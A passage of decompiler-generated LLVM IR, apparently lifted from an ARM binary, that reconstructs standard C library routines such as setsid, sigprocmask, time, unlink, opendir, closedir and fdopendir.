  store i32 %v9_12398, i32* @r6, align 4
  store i32 %v12_12398, i32* @r7, align 4
  store i32 %v15_12398, i32* @r8, align 4
  store i32 %v18_12398, i32* %sl.global-to-local, align 4
  %v0_123d4 = call i32 @__syscall_select()
  br label %dec_label_pc_123d8

dec_label_pc_123d8:                               ; preds = %entry.dec_label_pc_123d8_crit_edge, %dec_label_pc_123cc
  %v0_123d8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_123d8, i32* @r5, align 4
  %v0_123ec = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_123ec, i32* @r0, align 4
  %v0_123f4 = call i32 @__syscall_select()
  store i32 %v0_123f4, i32* @r4, align 4
  %v0_123fc = load i32, i32* @r5, align 4
  %v1_12400 = call i32 @__libc_disable_asynccancel(i32 %v0_123fc)
  %v0_12404 = load i32, i32* @r4, align 4
  %v2_1240c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1240c, i32* @r4, align 4
  store i32 %v6_12398, i32* @r5, align 4
  store i32 %v9_12398, i32* @r6, align 4
  store i32 %v12_12398, i32* @r7, align 4
  store i32 %v15_12398, i32* @r8, align 4
  store i32 %v18_12398, i32* @sl, align 4
  store i32 %v21_12398, i32* @lr, align 4
  ret i32 %v0_12404

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123d8, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1241c = load i32, i32* @r7, align 4
  store i32 %v3_1241c, i32* %stack_var_-8, align 4
  %v0_12428 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12428, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12428, -4095
  br i1 %tmp, label %dec_label_pc_12450, label %dec_label_pc_12438

dec_label_pc_12438:                               ; preds = %entry
  %v0_1243c = call i32 @__aeabi_read_tp()
  %v3_12440 = load i16, i16* @global_var_23068.363, align 2
  %v4_12440 = sext i16 %v3_12440 to i32
  %v0_12444 = load i32, i32* %r2.global-to-local, align 4
  %v1_12444 = sub i32 0, %v0_12444
  store i32 %v1_12444, i32* %r2.global-to-local, align 4
  %v3_12448 = add i32 %v4_12440, %v0_1243c
  %v4_12448 = inttoptr i32 %v3_12448 to i32*
  store i32 %v1_12444, i32* %v4_12448, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12450.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %entry, %dec_label_pc_12438
  %v1_12454 = phi i32 [ %v0_12428, %entry ], [ -1, %dec_label_pc_12438 ]
  %v2_12450 = phi i32 [ %v3_1241c, %entry ], [ %v2_12450.pre, %dec_label_pc_12438 ]
  store i32 %v2_12450, i32* @r7, align 4
  ret i32 %v1_12454

; uselistorder directives
  uselistorder i32 %v0_12428, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12450, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_12460 = icmp eq i32* %arg2, null
  br i1 %v2_12460, label %dec_label_pc_124a4, label %dec_label_pc_12474

dec_label_pc_12474:                               ; preds = %entry
  %v2_12474 = load i32, i32* %arg2, align 4
  %v1_12478 = icmp slt i32 %v2_12474, 0
  br i1 %v1_12478, label %dec_label_pc_1248c, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %dec_label_pc_12474
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_12480 = load i32, i32* %.pre3, align 4
  %v1_12484 = urem i32 %v3_12480, 2
  %v2_12484 = icmp eq i32 %v1_12484, 0
  br i1 %v2_12484, label %dec_label_pc_124a4, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12474, %dec_label_pc_12480
  %v2_1248c = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_1248c to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_124a4

dec_label_pc_124a4:                               ; preds = %dec_label_pc_12480, %entry, %dec_label_pc_1248c
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_124d8, label %dec_label_pc_124c0

dec_label_pc_124c0:                               ; preds = %dec_label_pc_124a4
  %v1_124c4 = sub i32 0, %arg1
  %v3_124c8 = load i16, i16* @global_var_23068.363, align 2
  %v4_124c8 = sext i16 %v3_124c8 to i32
  %v0_124cc = call i32 @__aeabi_read_tp()
  %v3_124d0 = add i32 %v4_124c8, %v0_124cc
  %v4_124d0 = inttoptr i32 %v3_124d0 to i32*
  store i32 %v1_124c4, i32* %v4_124d0, align 4
  br label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124a4, %dec_label_pc_124c0
  %v1_124e0 = phi i32 [ %arg1, %dec_label_pc_124a4 ], [ -1, %dec_label_pc_124c0 ]
  ret i32 %v1_124e0

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_124d8, { 1, 0 }
  uselistorder label %dec_label_pc_124a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1248c, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_124ec = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_124fc = call i32 @gettimeofday(i32 %v2_124ec, i32 0)
  %v2_12500 = load i32, i32* %stack_var_-16, align 4
  %v2_12504 = icmp eq i32* %arg1, null
  br i1 %v2_12504, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_12500, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_12500

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12518 = load i32, i32* @r7, align 4
  store i32 %v3_12518, i32* %stack_var_-8, align 4
  %v0_12524 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12524, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12524, -4095
  br i1 %tmp, label %dec_label_pc_1254c, label %dec_label_pc_12534

dec_label_pc_12534:                               ; preds = %entry
  %v0_12538 = call i32 @__aeabi_read_tp()
  %v3_1253c = load i16, i16* @global_var_23068.363, align 2
  %v4_1253c = sext i16 %v3_1253c to i32
  %v0_12540 = load i32, i32* %r2.global-to-local, align 4
  %v1_12540 = sub i32 0, %v0_12540
  store i32 %v1_12540, i32* %r2.global-to-local, align 4
  %v3_12544 = add i32 %v4_1253c, %v0_12538
  %v4_12544 = inttoptr i32 %v3_12544 to i32*
  store i32 %v1_12540, i32* %v4_12544, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1254c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1254c

dec_label_pc_1254c:                               ; preds = %entry, %dec_label_pc_12534
  %v1_12550 = phi i32 [ %v0_12524, %entry ], [ -1, %dec_label_pc_12534 ]
  %v2_1254c = phi i32 [ %v3_12518, %entry ], [ %v2_1254c.pre, %dec_label_pc_12534 ]
  store i32 %v2_1254c, i32* @r7, align 4
  ret i32 %v1_12550

; uselistorder directives
  uselistorder i32 %v0_12524, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1254c, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12558 = load i32, i32* @r4, align 4
  store i32 %v3_12558, i32* %stack_var_-24, align 4
  %v9_12558 = load i32, i32* @r6, align 4
  %v12_12558 = load i32, i32* @r7, align 4
  %v15_12558 = load i32, i32* @r8, align 4
  %v18_12558 = load i32, i32* @lr, align 4
  %v2_1255c = load i32, i32* %arg1, align 4
  store i32 %v2_1255c, i32* %r3.global-to-local, align 4
  %v3_12564 = icmp eq i32 %v2_1255c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  br i1 %v3_12564, label %dec_label_pc_12578, label %dec_label_pc_12594

dec_label_pc_12578:                               ; preds = %entry
  store i32 68320, i32* %r2.global-to-local, align 4
  %v0_1257c = call i32 @__aeabi_read_tp()
  %v3_12580 = load i16, i16* @global_var_23068.363, align 2
  %v4_12580 = sext i16 %v3_12580 to i32
  store i32 %v4_12580, i32* %r2.global-to-local, align 4
  %v0_12584 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12584, i32* %r1.global-to-local, align 4
  %v1_12588 = add i32 %v0_12584, 10
  store i32 %v1_12588, i32* %r3.global-to-local, align 4
  %v3_1258c = add i32 %v4_12580, %v0_1257c
  %v4_1258c = inttoptr i32 %v3_1258c to i32*
  store i32 %v1_12588, i32* %v4_1258c, align 4
  %v0_1263c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1263c

dec_label_pc_12594:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_12598 = add i32 %tmp, 24
  store i32 %v1_12598, i32* %r2.global-to-local, align 4
  %v4_125a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 68) to i32*), align 4
  store i32 %v4_125a0, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_125ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_125ac)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_125c4 = load i32, i32* @r6, align 4
  %v2_125c4 = add i32 %v0_125c4, 16
  %v3_125c4 = inttoptr i32 %v2_125c4 to i32*
  %v4_125c4 = load i32, i32* %v3_125c4, align 4
  call void @__pseudo_branch(i32 %v4_125c4)
  %v0_125d0 = load i32, i32* @r7, align 4
  %v1_125d0 = inttoptr i32 %v0_125d0 to i32*
  %v2_125d0 = load i32, i32* %v1_125d0, align 4
  store i32 %v2_125d0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_125e0 = load i32, i32* @r8, align 4
  store i32 %v0_125e0, i32* %v1_125d0, align 4
  %v0_125e4 = load i32, i32* @r6, align 4
  %v1_125e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_125e4 = add i32 %v1_125e4, %v0_125e4
  %v3_125e4 = inttoptr i32 %v2_125e4 to i32*
  %v4_125e4 = load i32, i32* %v3_125e4, align 4
  store i32 ptrtoint (i32* @global_var_125f0.390 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_125e4)
  %v0_125f0 = load i32, i32* @r7, align 4
  %v1_125f0 = add i32 %v0_125f0, 12
  %v2_125f0 = inttoptr i32 %v1_125f0 to i32*
  %v3_125f0 = load i32, i32* %v2_125f0, align 4
  store i32 %v3_125f0, i32* @r0, align 4
  %v0_125f4 = call i32 @free()
  %v0_125f8 = load i32, i32* @r7, align 4
  store i32 %v0_125f8, i32* @r0, align 4
  %v0_125fc = call i32 @free()
  %v0_12604 = load i32, i32* @r4, align 4
  store i32 %v0_12604, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_12604, -4095
  br i1 %tmp11, label %dec_label_pc_12638, label %dec_label_pc_12620

dec_label_pc_12620:                               ; preds = %dec_label_pc_12594
  store i32 68152, i32* %r3.global-to-local, align 4
  %v0_12624 = call i32 @__aeabi_read_tp()
  %v3_12628 = load i16, i16* @global_var_23068.363, align 2
  %v4_12628 = sext i16 %v3_12628 to i32
  store i32 %v4_12628, i32* %r3.global-to-local, align 4
  %v0_1262c = load i32, i32* %r2.global-to-local, align 4
  %v1_1262c = sub i32 0, %v0_1262c
  store i32 %v1_1262c, i32* %r2.global-to-local, align 4
  %v3_12630 = add i32 %v4_12628, %v0_12624
  %v4_12630 = inttoptr i32 %v3_12630 to i32*
  store i32 %v1_1262c, i32* %v4_12630, align 4
  %v0_12634 = load i32, i32* @r8, align 4
  br label %dec_label_pc_12638

dec_label_pc_12638:                               ; preds = %dec_label_pc_12594, %dec_label_pc_12620
  %v0_12638 = phi i32 [ %v0_12604, %dec_label_pc_12594 ], [ %v0_12634, %dec_label_pc_12620 ]
  store i32 %v0_12638, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12578, %dec_label_pc_12638
  %v0_1263c = phi i32 [ %v0_1263c.pre, %dec_label_pc_12578 ], [ %v0_12638, %dec_label_pc_12638 ]
  %v2_12644 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12644, i32* @r4, align 4
  store i32 %v9_12558, i32* @r6, align 4
  store i32 %v12_12558, i32* @r7, align 4
  store i32 %v15_12558, i32* @r8, align 4
  store i32 %v18_12558, i32* @lr, align 4
  ret i32 %v0_1263c

; uselistorder directives
  uselistorder i32 %v0_12604, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1263c, { 1, 0 }
  uselistorder label %dec_label_pc_12638, { 1, 0 }
}

define i32 @function_12654(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12654:
  %v0_12654 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12654, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12654
  %v2_12664 = load i32, i32* @r8, align 4
  %v3_12664 = load i32, i32* @sl, align 4
  %v8_12664 = lshr i32 %v2_12664, %v3_12664
  %v9_12664 = and i32 %v8_12664, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12654, %bb
  %v10_12664 = phi i32 [ %arg1, %dec_label_pc_12654 ], [ %v9_12664, %bb ]
  ret i32 %v10_12664

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12668 = load i32, i32* @r4, align 4
  %v6_12668 = load i32, i32* @r5, align 4
  %v9_12668 = load i32, i32* @r6, align 4
  %v12_12668 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_1267c = call i32 @malloc()
  %v2_12684 = icmp eq i32 %v0_1267c, 0
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* @r6, align 4
  br i1 %v2_12684, label %bb, label %dec_label_pc_12694

bb:                                               ; preds = %entry
  br label %dec_label_pc_12720

dec_label_pc_12694:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @r4, align 4
  %v2_12698 = icmp ugt i32 %v0_12698, 511
  %v2_1269c = add i32 %v0_1267c, 4
  %v3_1269c = inttoptr i32 %v2_1269c to i32*
  store i32 0, i32* %v3_1269c, align 4
  %v0_126a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a0 = add i32 %v0_1267c, 16
  %v3_126a0 = inttoptr i32 %v2_126a0 to i32*
  store i32 %v0_126a0, i32* %v3_126a0, align 4
  %v0_126a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a4 = add i32 %v0_1267c, 8
  %v3_126a4 = inttoptr i32 %v2_126a4 to i32*
  store i32 %v0_126a4, i32* %v3_126a4, align 4
  br i1 %v2_12698, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_12694
  %v0_126ac2 = load i32, i32* @r4, align 4
  %v2_126ac3 = add i32 %v0_1267c, 20
  %v3_126ac4 = inttoptr i32 %v2_126ac3 to i32*
  store i32 %v0_126ac2, i32* %v3_126ac4, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_12694
  %v1_126a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_126a8 = add i32 %v1_126a8, 512
  store i32 %v2_126a8, i32* %r3.global-to-local, align 4
  %v0_126ac = load i32, i32* @r4, align 4
  %v2_126ac = add i32 %v0_1267c, 20
  %v3_126ac = inttoptr i32 %v2_126ac to i32*
  store i32 %v0_126ac, i32* %v3_126ac, align 4
  %v1_126b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_126b0, i32* %v3_126ac, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_1267c, i32* @r5, align 4
  %v0_126b8 = load i32, i32* @r7, align 4
  %v2_126b8 = inttoptr i32 %v0_1267c to i32*
  store i32 %v0_126b8, i32* %v2_126b8, align 4
  %v0_126bc = load i32, i32* @r5, align 4
  %v1_126bc = add i32 %v0_126bc, 20
  %v2_126bc = inttoptr i32 %v1_126bc to i32*
  %v3_126bc = load i32, i32* %v2_126bc, align 4
  store i32 %v3_126bc, i32* %r1.global-to-local, align 4
  %v2_126c4 = call i32 @calloc(i32 1, i32 %v3_126bc)
  %v2_126c8 = icmp eq i32 %v2_126c4, 0
  store i32 %v2_126c4, i32* @r4, align 4
  %v1_126d0 = load i32, i32* @r5, align 4
  %v2_126d0 = add i32 %v1_126d0, 12
  %v3_126d0 = inttoptr i32 %v2_126d0 to i32*
  store i32 %v2_126c4, i32* %v3_126d0, align 4
  br i1 %v2_126c8, label %dec_label_pc_126d8, label %dec_label_pc_126e8

dec_label_pc_126d8:                               ; preds = %bb17
  %v0_126d8 = load i32, i32* @r5, align 4
  store i32 %v0_126d8, i32* @r0, align 4
  %v0_126dc = call i32 @free()
  %v0_126e0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_12720

dec_label_pc_126e8:                               ; preds = %bb17
  %v0_126ec = load i32, i32* @r6, align 4
  %v2_126ec = add i32 %v0_126ec, -34192
  store i32 %v2_126ec, i32* %r3.global-to-local, align 4
  %v1_126f4 = inttoptr i32 %v2_126ec to i32*
  %v2_126f4 = load i32, i32* %v1_126f4, align 4
  %v3_126f4 = add i32 %v0_126ec, -34188
  %v4_126f4 = inttoptr i32 %v3_126f4 to i32*
  %v5_126f4 = load i32, i32* %v4_126f4, align 4
  store i32 %v5_126f4, i32* %r1.global-to-local, align 4
  %v6_126f4 = add i32 %v0_126ec, -34184
  %v7_126f4 = inttoptr i32 %v6_126f4 to i32*
  %v8_126f4 = load i32, i32* %v7_126f4, align 4
  store i32 %v8_126f4, i32* %r2.global-to-local, align 4
  %v9_126f4 = add i32 %v0_126ec, -34180
  %v10_126f4 = inttoptr i32 %v9_126f4 to i32*
  %v11_126f4 = load i32, i32* %v10_126f4, align 4
  store i32 %v11_126f4, i32* %r3.global-to-local, align 4
  %v12_126f4 = add i32 %v0_126ec, -34176
  %v1_12700 = inttoptr i32 %v12_126f4 to i32*
  %v2_12700 = load i32, i32* %v1_12700, align 4
  %v3_12700 = add i32 %v0_126ec, -34172
  %v4_12700 = inttoptr i32 %v3_12700 to i32*
  %v5_12700 = load i32, i32* %v4_12700, align 4
  store i32 %v2_12700, i32* %stack_var_-32, align 4
  store i32 %v5_126f4, i32* %r1.global-to-local, align 4
  store i32 %v8_126f4, i32* %r2.global-to-local, align 4
  store i32 %v11_126f4, i32* %r3.global-to-local, align 4
  %v0_12710 = load i32, i32* @r5, align 4
  %v1_12710 = add i32 %v0_12710, 24
  %v1_12714 = inttoptr i32 %v1_12710 to i32*
  store i32 %v2_126f4, i32* %v1_12714, align 4
  %v3_12714 = add i32 %v0_12710, 28
  %v4_12714 = inttoptr i32 %v3_12714 to i32*
  %v5_12714 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_12714, i32* %v4_12714, align 4
  %v6_12714 = add i32 %v0_12710, 32
  %v7_12714 = inttoptr i32 %v6_12714 to i32*
  %v8_12714 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_12714, i32* %v7_12714, align 4
  %v9_12714 = add i32 %v0_12710, 36
  %v10_12714 = inttoptr i32 %v9_12714 to i32*
  %v11_12714 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_12714, i32* %v10_12714, align 4
  %v12_12714 = add i32 %v0_12710, 40
  %v2_12718 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_12700, i32* %r1.global-to-local, align 4
  %v1_1271c = inttoptr i32 %v12_12714 to i32*
  store i32 %v2_12718, i32* %v1_1271c, align 4
  %v3_1271c = add i32 %v0_12710, 44
  %v4_1271c = inttoptr i32 %v3_1271c to i32*
  %v5_1271c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1271c, i32* %v4_1271c, align 4
  %v0_12720.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12720

dec_label_pc_12720:                               ; preds = %bb, %dec_label_pc_126d8, %dec_label_pc_126e8
  %v0_12720 = phi i32 [ 0, %bb ], [ %v0_126e0, %dec_label_pc_126d8 ], [ %v0_12720.pre, %dec_label_pc_126e8 ]
  store i32 %v3_12668, i32* @r4, align 4
  store i32 %v6_12668, i32* @r5, align 4
  store i32 %v9_12668, i32* @r6, align 4
  store i32 %v12_12668, i32* @r7, align 4
  ret i32 %v0_12720

; uselistorder directives
  uselistorder i32 %v2_126c4, { 1, 0, 2 }
  uselistorder i32 %v0_1267c, { 2, 1, 4, 0, 6, 5, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_12720, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_12738 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_12740 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_12770, label %dec_label_pc_12758

dec_label_pc_12758:                               ; preds = %entry
  %v0_1275c = call i32 @__aeabi_read_tp()
  %v3_12760 = load i16, i16* @global_var_23068.363, align 2
  %v4_12760 = sext i16 %v3_12760 to i32
  %v0_12764 = load i32, i32* %r2.global-to-local, align 4
  %v1_12764 = sub i32 0, %v0_12764
  store i32 %v1_12764, i32* %r2.global-to-local, align 4
  %v3_12768 = add i32 %v4_12760, %v0_1275c
  %v4_12768 = inttoptr i32 %v3_12768 to i32*
  store i32 %v1_12764, i32* %v4_12768, align 4
  br label %dec_label_pc_12794

dec_label_pc_12770:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_12770 = icmp slt i32 %arg1, 0
  br i1 %v1_12770, label %dec_label_pc_12794, label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %dec_label_pc_12770
  store i32 %v2_12740, i32* @r1, align 4
  %v0_1277c = call i32 @fstat()
  %v1_12780 = icmp slt i32 %v0_1277c, 0
  br i1 %v1_12780, label %dec_label_pc_12788, label %dec_label_pc_1279c

dec_label_pc_12788:                               ; preds = %dec_label_pc_12778
  br label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12788, %dec_label_pc_12770, %dec_label_pc_12758
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127e0

dec_label_pc_1279c:                               ; preds = %dec_label_pc_12778
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_127a4 = load i32, i32* @r7, align 4
  %v3_127a8 = call i32 @__GI___fcntl_nocancel(i32 %v0_127a4, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_127b0 = load i32, i32* @r7, align 4
  %v2_127b4 = call i32 @fd_to_DIR(i32 %v0_127b0, i32 %tmp)
  store i32 %v2_127b4, i32* %r1.global-to-local, align 4
  %v2_127b8 = icmp eq i32 %v2_127b4, 0
  br i1 %v2_127b8, label %dec_label_pc_127c0, label %dec_label_pc_127e0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_1279c
  %v0_127d0 = call i32 @__aeabi_read_tp()
  %v3_127d4 = load i16, i16* @global_var_23068.363, align 2
  %v4_127d4 = sext i16 %v3_127d4 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_127dc = add i32 %v4_127d4, %v0_127d0
  %v4_127dc = inttoptr i32 %v3_127dc to i32*
  store i32 12, i32* %v4_127dc, align 4
  %v0_127e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_1279c, %dec_label_pc_12794, %dec_label_pc_127c0
  %v0_127e0 = phi i32 [ %v2_127b4, %dec_label_pc_1279c ], [ 0, %dec_label_pc_12794 ], [ %v0_127e0.pre, %dec_label_pc_127c0 ]
  store i32 %v3_12738, i32* @r7, align 4
  ret i32 %v0_127e0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_127e0, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_127f0:
  %v0_127f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_127f0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_127f0
  %v2_127f8 = load i32, i32* @ip, align 4
  %v5_127f8 = mul i32 %v2_127f8, 131072
  %v6_127f8 = and i32 %v5_127f8, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_127f0, %bb
  %v7_127f8 = phi i32 [ %arg1, %dec_label_pc_127f0 ], [ %v6_127f8, %bb ]
  ret i32 %v7_127f8

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_12800 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_12800, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1280c = call i32 @fstat()
  store i32 %v0_1280c, i32* @r5, align 4
  %v2_12810 = icmp eq i32 %v0_1280c, 0
  br i1 %v2_12810, label %dec_label_pc_12818, label %dec_label_pc_12890

dec_label_pc_12818:                               ; preds = %entry
  %v1_1281c = and i32 %tmp4, 61440
  store i32 %v1_1281c, i32* @r3, align 4
  %v7_12820 = icmp eq i32 %v1_1281c, 16384
  br i1 %v7_12820, label %dec_label_pc_12840, label %dec_label_pc_12828

dec_label_pc_12828:                               ; preds = %dec_label_pc_12818
  %v0_1282c = call i32 @__aeabi_read_tp()
  %v3_12830 = load i16, i16* @global_var_23068.363, align 2
  %v0_12834 = load i32, i32* @r5, align 4
  store i32 %v0_12834, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12874

dec_label_pc_12840:                               ; preds = %dec_label_pc_12818
  %v0_12840 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_12848 = call i32 @__libc_fcntl(i32 %v0_12840, i32 3)
  %v7_1284c = icmp eq i32 %v2_12848, -1
  br i1 %v7_1284c, label %dec_label_pc_12890, label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_12840
  %v1_12854 = urem i32 %v2_12848, 4
  store i32 %v1_12854, i32* %r3.global-to-local, align 4
  %v7_12858 = icmp eq i32 %v1_12854, 1
  br i1 %v7_12858, label %dec_label_pc_12860, label %dec_label_pc_1287c

dec_label_pc_12860:                               ; preds = %dec_label_pc_12854
  %v0_12864 = call i32 @__aeabi_read_tp()
  %v3_12868 = load i16, i16* @global_var_23068.363, align 2
  %v0_1286c = load i32, i32* @r5, align 4
  store i32 %v0_1286c, i32* %r1.global-to-local, align 4
  %v0_12870 = load i32, i32* %r3.global-to-local, align 4
  %v1_12870 = add i32 %v0_12870, 21
  br label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %dec_label_pc_12828, %dec_label_pc_12860
  %v2_12874.in = phi i16 [ %v3_12830, %dec_label_pc_12828 ], [ %v3_12868, %dec_label_pc_12860 ]
